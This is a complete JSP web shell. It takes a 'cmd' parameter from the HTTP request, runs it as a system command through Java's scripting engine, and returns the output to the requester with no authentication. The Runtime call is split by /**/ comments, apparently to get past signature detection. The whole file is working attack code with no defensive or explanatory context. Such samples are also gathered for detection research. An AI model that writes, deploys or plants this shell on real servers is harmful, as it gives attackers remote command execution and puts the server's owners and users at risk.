<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="javax.script.ScriptEngine" %>
<%!
    public static Object exec(String cmd) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("js");
        Object obj = engine.eval("var runtime = java.lang./**/Runtime./**/getRuntime();" +
                "var process = runtime.exec(\"" + cmd + "\");" +
                "var inputStream = process.getInputStream();" +
                "var scanner = new java.util.Scanner(inputStream,\"GBK\").useDelimiter(\"\\\\A\");" +
                "var result = scanner.hasNext() ? scanner.next() : \"\";" +
                "scanner.close();" +
                "result;");

        return obj;
    }

%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(exec(cmd));
    }
%>